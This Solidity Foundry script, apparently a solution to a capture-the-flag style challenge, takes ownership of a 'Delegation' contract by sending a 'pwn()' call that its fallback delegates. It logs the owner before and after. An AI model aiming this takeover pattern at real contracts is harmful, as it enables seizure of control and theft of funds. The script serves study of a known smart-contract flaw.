// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "instances/IDelegation.sol";

contract Attacker is Script {
    Delegation instance = Delegation(0xC2c7129a295f0128D89D6b387c315D71514b1650);

    function run() external {
        vm.startBroadcast(uint256(vm.envBytes32("PRIVATE_KEY")));
        console.log("Initial Owner:", instance.owner());
        (bool success, ) = address(instance).call(abi.encodeWithSignature("pwn()"));
        require(success, "Call failed");
        console.log("Final Owner:", instance.owner());
        vm.stopBroadcast();
    }
}